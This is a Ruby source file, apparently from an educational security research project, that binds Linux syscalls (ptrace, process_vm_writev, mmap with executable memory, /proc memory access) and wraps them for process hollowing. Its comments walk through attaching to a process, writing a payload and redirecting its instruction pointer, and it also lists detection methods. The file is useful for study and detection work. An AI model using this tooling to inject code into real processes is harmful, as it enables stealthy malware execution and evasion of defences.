# frozen_string_literal: true

# =============================================================================
# RubyGuardian Phase 1a -- Linux API FFI Bindings
#
# FFI bindings for Linux system calls required for process hollowing on Linux.
# Provides Ruby-native interfaces to ptrace, mmap, process_vm_writev, and
# related syscalls for educational process manipulation research.
#
# EDUCATIONAL PURPOSE ONLY -- Authorized security research.
#
# MITRE ATT&CK: T1055.012 - Process Injection: Process Hollowing
#
# DETECTION METHODS:
# - Monitor ptrace attach events via auditd / seccomp-bpf
# - Alert on process_vm_writev calls from non-debugger processes
# - Watch /proc/<pid>/mem access patterns from Ruby processes
# - Yara rules for FFI::Library usage combined with ptrace constants
# =============================================================================

require 'ffi'
require_relative 'common_types'

module RubyGuardian
  module ProcessHollowing
    module FFIBindings
      # ────────────────────────────────────────────────────────────────
      # libc -- Linux System Call Interface
      # ────────────────────────────────────────────────────────────────
      module LibC
        extend FFI::Library

        if PLATFORM == :linux
          ffi_lib 'c'

          # ── ptrace ──
          #
          # The ptrace system call is the primary mechanism for process
          # debugging and manipulation on Linux. It allows:
          #   - Attaching to running processes (PTRACE_ATTACH / PTRACE_SEIZE)
          #   - Reading/writing memory (PTRACE_PEEKDATA / PTRACE_POKEDATA)
          #   - Reading/writing registers (PTRACE_GETREGS / PTRACE_SETREGS)
          #   - Single-stepping execution (PTRACE_SINGLESTEP)
          #
          # For process hollowing, we use ptrace to:
          #   1. Attach to the target (suspended) process
          #   2. Read its register state to find the instruction pointer
          #   3. Write our payload into its memory space
          #   4. Modify the instruction pointer to our payload entry
          #   5. Detach and let it resume with our code
          #
          # @param request [Integer] PTRACE_* request code
          # @param pid [Integer] Target process ID
          # @param addr [Pointer] Address in target (request-specific)
          # @param data [Pointer] Data for the request
          # @return [Integer] Request-specific return value; -1 on error
          attach_function :ptrace, [:int, :int, :pointer, :pointer], :long

          # ── mmap / munmap / mprotect ──
          #
          # Memory mapping functions used to allocate executable memory
          # in the current process. For remote process injection, we use
          # process_vm_writev instead, but mmap is useful for preparing
          # local payload buffers with correct permissions.
          #
          # @param addr [Pointer] Desired address (NULL for kernel choice)
          # @param length [Integer] Length of mapping
          # @param prot [Integer] PROT_READ | PROT_WRITE | PROT_EXEC
          # @param flags [Integer] MAP_PRIVATE | MAP_ANONYMOUS
          # @param fd [Integer] File descriptor (-1 for anonymous)
          # @param offset [Integer] Offset in file
          # @return [Pointer] Address of mapping; MAP_FAILED on error
          attach_function :mmap, [:pointer, :size_t, :int, :int, :int, :long], :pointer

          # Unmap a previously mapped region
          # @param addr [Pointer] Start of mapping
          # @param length [Integer] Length to unmap
          # @return [Integer] 0 on success, -1 on error
          attach_function :munmap, [:pointer, :size_t], :int

          # Change protection on a memory region
          # @param addr [Pointer] Start of region (page-aligned)
          # @param length [Integer] Length of region
          # @param prot [Integer] New protection flags
          # @return [Integer] 0 on success, -1 on error
          attach_function :mprotect, [:pointer, :size_t, :int], :int

          # ── process_vm_readv / process_vm_writev ──
          #
          # These are the modern Linux syscalls for cross-process memory
          # I/O. They are more efficient than ptrace PEEKDATA/POKEDATA
          # because they can transfer arbitrary amounts of data in a
          # single syscall, using scatter/gather I/O vectors.
          #
          # For process hollowing, process_vm_writev is used to write
          # the payload binary into the target process's address space
          # after we've allocated memory there via ptrace + mmap shellcode.
          #
          # @param pid [Integer] Target process ID
          # @param local_iov [Pointer] Array of local iovec structures
          # @param liovcnt [Integer] Number of local iov entries
          # @param remote_iov [Pointer] Array of remote iovec structures
          # @param riovcnt [Integer] Number of remote iov entries
          # @param flags [Integer] Currently unused (must be 0)
          # @return [Integer] Number of bytes transferred; -1 on error
          attach_function :process_vm_readv,
                          [:int, :pointer, :ulong, :pointer, :ulong, :ulong],
                          :long

          attach_function :process_vm_writev,
                          [:int, :pointer, :ulong, :pointer, :ulong, :ulong],
                          :long

          # ── waitpid ──
          #
          # Wait for a process state change. Used after ptrace attach
          # to wait for the target to stop before manipulating it.
          #
          # @param pid [Integer] Process to wait for (-1 for any child)
          # @param status [Pointer] Output: status information
          # @param options [Integer] WNOHANG, WUNTRACED, etc.
          # @return [Integer] PID of changed process; -1 on error
          attach_function :waitpid, [:int, :pointer, :int], :int

          # ── kill ──
          #
          # Send a signal to a process. Used to stop/continue the target.
          # @param pid [Integer] Target PID
          # @param sig [Integer] Signal number
          # @return [Integer] 0 on success, -1 on error
          attach_function :kill, [:int, :int], :int

          # ── Error handling ──
          attach_function :strerror, [:int], :string

          # ── /proc/<pid>/mem access ──
          #
          # Alternative to ptrace for memory I/O. Requires
          # PTRACE_ATTACH first (or CAP_SYS_PTRACE capability).
          attach_function :open, [:string, :int], :int
          attach_function :close, [:int], :int
          attach_function :pread, [:int, :pointer, :size_t, :long], :long
          attach_function :pwrite, [:int, :pointer, :size_t, :long], :long

          # ── fork/exec ──
          #
          # Used to create the target (sacrificial) process for hollowing.
          attach_function :fork, [], :int
          attach_function :execv, [:string, :pointer], :int
          attach_function :_exit, [:int], :void

          # ── Misc ──
          attach_function :getpid, [], :int
          attach_function :getuid, [], :int
          attach_function :usleep, [:uint], :int
        end
      end

      # ────────────────────────────────────────────────────────────────
      # Linux API Convenience Wrapper
      # ────────────────────────────────────────────────────────────────
      #
      # Higher-level methods that wrap raw FFI syscalls with error
      # checking, logging, and Ruby-friendly interfaces. Each method
      # documents its role in the hollowing process.
      #
      module LinuxAPI
        module_function

        # Map of errno values to human-readable descriptions for
        # common ptrace failure modes
        PTRACE_ERRORS = {
          1  => 'EPERM: Operation not permitted (need root or CAP_SYS_PTRACE)',
          3  => 'ESRCH: No such process (target PID does not exist)',
          5  => 'EIO: I/O error (bad address in target)',
          14 => 'EFAULT: Bad address (invalid pointer)',
          16 => 'EBUSY: Device or resource busy (already traced)',
          22 => 'EINVAL: Invalid argument'
        }.freeze

        # Flags for open()
        O_RDONLY = 0
        O_WRONLY = 1
        O_RDWR   = 2

        # waitpid options
        WNOHANG   = 1
        WUNTRACED = 2

        # Attach to a process for tracing.
        #
        # EDUCATIONAL: PTRACE_ATTACH sends SIGSTOP to the target and
        # makes us its tracer. The target will stop and we must waitpid
        # before any further ptrace operations.
        #
        # PTRACE_SEIZE is a newer alternative that attaches without
        # stopping the process -- we can then use PTRACE_INTERRUPT when
        # we're ready to manipulate it.
        #
        # @param pid [Integer] Target process ID
        # @param method [Symbol] :attach (PTRACE_ATTACH) or :seize (PTRACE_SEIZE)
        # @return [Boolean] true on success
        # @raise [RuntimeError] on failure
        def ptrace_attach(pid, method: :attach)
          raise NotImplementedError, 'Linux API only available on Linux' unless PLATFORM == :linux

          request = case method
                    when :attach then LinuxConstants::PTRACE_ATTACH
                    when :seize  then LinuxConstants::PTRACE_SEIZE
                    else raise ArgumentError, "Unknown attach method: #{method}"
                    end

          result = LibC.ptrace(request, pid, nil, nil)
          if result == -1
            errno = FFI.errno
            raise "ptrace #{method} failed on PID #{pid}: #{PTRACE_ERRORS[errno] || "errno #{errno}"}"
          end

          # Wait for the target to stop (for PTRACE_ATTACH)
          if method == :attach
            wait_for_stop(pid)
          end

          true
        end

        # Detach from a traced process, allowing it to resume.
        #
        # @param pid [Integer] Target process ID
        # @param signal [Integer] Signal to deliver on detach (0 = none)
        # @return [Boolean] true on success
        def ptrace_detach(pid, signal: 0)
          raise NotImplementedError, 'Linux API only available on Linux' unless PLATFORM == :linux

          result = LibC.ptrace(
            LinuxConstants::PTRACE_DETACH, pid, nil,
            FFI::Pointer.new(:void, signal)
          )

          if result == -1
            errno = FFI.errno
            raise "ptrace detach failed on PID #{pid}: errno #{errno}"
          end

          true
        end

        # Read the register state of a stopped process.
        #
        # EDUCATIONAL: The register state tells us where the process is
        # executing (RIP), where its stack is (RSP), and allows us to
        # modify execution flow by changing RIP to point to our payload.
        #
        # @param pid [Integer] Target PID (must be stopped/traced)
        # @return [UserRegsStruct] Register state
        def ptrace_getregs(pid)
          raise NotImplementedError, 'Linux API only available on Linux' unless PLATFORM == :linux

          regs = UserRegsStruct.new
          result = LibC.ptrace(
            LinuxConstants::PTRACE_GETREGS, pid, nil, regs.pointer
          )

          if result == -1
            errno = FFI.errno
            raise "ptrace GETREGS failed on PID #{pid}: errno #{errno}"
          end

          regs
        end

        # Set the register state of a stopped process.
        #
        # EDUCATIONAL: This is how we redirect execution. By modifying
        # RIP (instruction pointer) to our payload's entry point and
        # ensuring RSP points to valid stack, the process will execute
        # our code when resumed.
        #
        # @param pid [Integer] Target PID (must be stopped/traced)
        # @param regs [UserRegsStruct] New register state
        # @return [Boolean] true on success
        def ptrace_setregs(pid, regs)
          raise NotImplementedError, 'Linux API only available on Linux' unless PLATFORM == :linux

          result = LibC.ptrace(
            LinuxConstants::PTRACE_SETREGS, pid, nil, regs.pointer
          )

          if result == -1
            errno = FFI.errno
            raise "ptrace SETREGS failed on PID #{pid}: errno #{errno}"
          end

          true
        end

        # Read a word from the target process memory via ptrace.
        #
        # @param pid [Integer] Target PID
        # @param address [Integer] Address to read from
        # @return [Integer] The word at that address
        def ptrace_peekdata(pid, address)
          raise NotImplementedError, 'Linux API only available on Linux' unless PLATFORM == :linux

          FFI.errno = 0
          result = LibC.ptrace(
            LinuxConstants::PTRACE_PEEKDATA, pid,
            FFI::Pointer.new(:void, address), nil
          )

          if result == -1 && FFI.errno != 0
            raise "ptrace PEEKDATA failed at 0x#{address.to_s(16)}: errno #{FFI.errno}"
          end

          result
        end

        # Write a word to the target process memory via ptrace.
        #
        # @param pid [Integer] Target PID
        # @param address [Integer] Address to write to
        # @param value [Integer] Word value to write
        # @return [Boolean] true on success
        def ptrace_pokedata(pid, address, value)
          raise NotImplementedError, 'Linux API only available on Linux' unless PLATFORM == :linux

          result = LibC.ptrace(
            LinuxConstants::PTRACE_POKEDATA, pid,
            FFI::Pointer.new(:void, address),
            FFI::Pointer.new(:void, value)
          )

          if result == -1
            raise "ptrace POKEDATA failed at 0x#{address.to_s(16)}: errno #{FFI.errno}"
          end

          true
        end

        # Write bulk data to a remote process using process_vm_writev.
        #
        # EDUCATIONAL: process_vm_writev is the modern, efficient way
        # to write data into another process. Unlike ptrace POKEDATA
        # (which writes one word at a time), process_vm_writev can
        # transfer arbitrary amounts in a single syscall.
        #
        # @param pid [Integer] Target process ID
        # @param remote_address [Integer] Address in target to write to
        # @param data [String] Data bytes to write
        # @return [Integer] Number of bytes written
        def write_process_memory(pid, remote_address, data)
          raise NotImplementedError, 'Linux API only available on Linux' unless PLATFORM == :linux

          # Prepare local iovec pointing to our data buffer
          local_buf = FFI::MemoryPointer.from_string(data)
          local_iov = Iovec.new
          local_iov[:iov_base] = local_buf
          local_iov[:iov_len] = data.bytesize

          # Prepare remote iovec pointing to target address
          remote_iov = Iovec.new
          remote_iov[:iov_base] = FFI::Pointer.new(:void, remote_address)
          remote_iov[:iov_len] = data.bytesize

          bytes_written = LibC.process_vm_writev(
            pid,
            local_iov.pointer, 1,
            remote_iov.pointer, 1,
            0
          )

          if bytes_written == -1
            errno = FFI.errno
            raise "process_vm_writev failed (PID #{pid}, addr 0x#{remote_address.to_s(16)}): " \
                  "errno #{errno} -- #{LibC.strerror(errno)}"
          end

          bytes_written
        end

        # Read bulk data from a remote process using process_vm_readv.
        #
        # @param pid [Integer] Target process ID
        # @param remote_address [Integer] Address in target to read from
        # @param length [Integer] Number of bytes to read
        # @return [String] Data bytes read
        def read_process_memory(pid, remote_address, length)
          raise NotImplementedError, 'Linux API only available on Linux' unless PLATFORM == :linux

          local_buf = FFI::MemoryPointer.new(:uint8, length)
          local_iov = Iovec.new
          local_iov[:iov_base] = local_buf
          local_iov[:iov_len] = length

          remote_iov = Iovec.new
          remote_iov[:iov_base] = FFI::Pointer.new(:void, remote_address)
          remote_iov[:iov_len] = length

          bytes_read = LibC.process_vm_readv(
            pid,
            local_iov.pointer, 1,
            remote_iov.pointer, 1,
            0
          )

          if bytes_read == -1
            errno = FFI.errno
            raise "process_vm_readv failed (PID #{pid}, addr 0x#{remote_address.to_s(16)}): " \
                  "errno #{errno} -- #{LibC.strerror(errno)}"
          end

          local_buf.read_bytes(bytes_read)
        end

        # Allocate memory in the current process with specified permissions.
        #
        # @param size [Integer] Number of bytes to allocate
        # @param prot [Integer] PROT_* flags
        # @param flags [Integer] MAP_* flags (default: private anonymous)
        # @return [FFI::Pointer] Pointer to allocated memory
        def mmap_alloc(size, prot: LinuxConstants::PROT_RWX,
                       flags: LinuxConstants::MAP_PRIVATE | LinuxConstants::MAP_ANONYMOUS)
          raise NotImplementedError, 'Linux API only available on Linux' unless PLATFORM == :linux

          aligned_size = TypeUtils.page_align_up(size)
          ptr = LibC.mmap(nil, aligned_size, prot, flags, -1, 0)

          if ptr.address == 0xFFFFFFFFFFFFFFFF || ptr.null?
            raise "mmap failed: errno #{FFI.errno}"
          end

          ptr
        end

        # Free previously mapped memory.
        #
        # @param ptr [FFI::Pointer] Start of mapping
        # @param size [Integer] Size of mapping
        # @return [Boolean] true on success
        def mmap_free(ptr, size)
          raise NotImplementedError, 'Linux API only available on Linux' unless PLATFORM == :linux

          result = LibC.munmap(ptr, TypeUtils.page_align_up(size))
          raise "munmap failed: errno #{FFI.errno}" if result == -1

          true
        end

        # Read the memory maps of a process from /proc/<pid>/maps.
        #
        # EDUCATIONAL: /proc/<pid>/maps shows all memory regions with
        # their permissions, file mappings, and addresses. This is
        # essential for finding where to inject code and what regions
        # to unmap (the original ELF segments).
        #
        # @param pid [Integer] Target process ID
        # @return [Array<Hash>] Parsed memory map entries
        def read_proc_maps(pid)
          maps_path = "/proc/#{pid}/maps"
          raise "Cannot read #{maps_path}" unless File.readable?(maps_path)

          File.readlines(maps_path).map do |line|
            parse_maps_line(line.strip)
          end.compact
        end

        # Read the ELF header from a file or memory.
        #
        # @param path [String] Path to ELF binary
        # @return [Hash] Parsed ELF header information
        def parse_elf_header(path)
          data = File.binread(path, 64)
          magic = data[0..3]

          unless magic == LinuxConstants::ELF_MAGIC
            raise "Not an ELF file: #{path} (magic: #{magic.inspect})"
          end

          elf_class = data[4].ord  # 1 = 32-bit, 2 = 64-bit
          unless elf_class == 2
            raise "Only 64-bit ELF supported (got class #{elf_class})"
          end

          {
            class: :elf64,
            encoding: data[5].ord == 1 ? :little_endian : :big_endian,
            type: data[16..17].unpack1('v'),
            machine: data[18..19].unpack1('v'),
            entry_point: data[24..31].unpack1('Q<'),
            phoff: data[32..39].unpack1('Q<'),
            phnum: data[56..57].unpack1('v'),
            phentsize: data[54..55].unpack1('v')
          }
        end

        # Parse ELF program headers to find loadable segments.
        #
        # EDUCATIONAL: PT_LOAD segments define the memory layout of the
        # executable. When hollowing, we need to map each PT_LOAD segment
        # into the target at its specified virtual address with the
        # correct permissions.
        #
        # @param path [String] Path to ELF binary
        # @return [Array<Hash>] Loadable segment descriptions
        def parse_program_headers(path)
          header = parse_elf_header(path)
          data = File.binread(path)
          segments = []

          header[:phnum].times do |i|
            offset = header[:phoff] + (i * header[:phentsize])
            phdr = data[offset, header[:phentsize]]

            p_type  = phdr[0..3].unpack1('V')
            p_flags = phdr[4..7].unpack1('V')
            p_offset = phdr[8..15].unpack1('Q<')
            p_vaddr  = phdr[16..23].unpack1('Q<')
            p_filesz = phdr[32..39].unpack1('Q<')
            p_memsz  = phdr[40..47].unpack1('Q<')
            p_align  = phdr[48..55].unpack1('Q<')

            next unless p_type == LinuxConstants::PT_LOAD

            segments << {
              type: :pt_load,
              flags: p_flags,
              offset: p_offset,
              vaddr: p_vaddr,
              filesz: p_filesz,
              memsz: p_memsz,
              align: p_align,
              prot: TypeUtils.elf_flags_to_mmap_prot(p_flags)
            }
          end

          segments
        end

        # Wait for a process to stop (after PTRACE_ATTACH or signal).
        #
        # @param pid [Integer] Process to wait for
        # @param timeout [Float] Maximum seconds to wait
        # @return [Integer] Wait status
        def wait_for_stop(pid, timeout: 10.0)
          raise NotImplementedError, 'Linux API only available on Linux' unless PLATFORM == :linux

          status_ptr = FFI::MemoryPointer.new(:int)
          deadline = Time.now + timeout

          loop do
            result = LibC.waitpid(pid, status_ptr, WUNTRACED | WNOHANG)

            if result > 0
              return status_ptr.read_int
            elsif result == -1
              raise "waitpid failed for PID #{pid}: errno #{FFI.errno}"
            end

            raise "Timeout waiting for PID #{pid} to stop" if Time.now > deadline
            LibC.usleep(1000) # 1ms
          end
        end

        # Stop a process with SIGSTOP.
        #
        # @param pid [Integer] Process to stop
        # @return [Boolean] true on success
        def stop_process(pid)
          raise NotImplementedError, 'Linux API only available on Linux' unless PLATFORM == :linux

          result = LibC.kill(pid, LinuxConstants::SIGSTOP)
          raise "kill SIGSTOP failed for PID #{pid}: errno #{FFI.errno}" if result == -1

          wait_for_stop(pid)
          true
        end

        # Continue a stopped process with SIGCONT.
        #
        # @param pid [Integer] Process to continue
        # @return [Boolean] true on success
        def continue_process(pid)
          raise NotImplementedError, 'Linux API only available on Linux' unless PLATFORM == :linux

          result = LibC.kill(pid, LinuxConstants::SIGCONT)
          raise "kill SIGCONT failed for PID #{pid}: errno #{FFI.errno}" if result == -1

          true
        end

        # ── Private helpers ──

        # Parse a single line from /proc/<pid>/maps.
        #
        # Example line:
        #   7f8a4c000000-7f8a4c021000 rw-p 00000000 00:00 0  [heap]
        #
        # @param line [String] A line from /proc/pid/maps
        # @return [Hash, nil] Parsed entry or nil for unparseable lines
        def parse_maps_line(line)
          match = line.match(
            /^([0-9a-f]+)-([0-9a-f]+)\s+([\w-]+)\s+([0-9a-f]+)\s+(\S+)\s+(\d+)\s*(.*)$/
          )
          return nil unless match

          perms = match[3]
          {
            start_addr: match[1].to_i(16),
            end_addr: match[2].to_i(16),
            permissions: perms,
            readable: perms[0] == 'r',
            writable: perms[1] == 'w',
            executable: perms[2] == 'x',
            private: perms[3] == 'p',
            offset: match[4].to_i(16),
            device: match[5],
            inode: match[6].to_i,
            pathname: match[7]&.strip
          }
        end

        private_class_method :parse_maps_line
      end
    end
  end
end
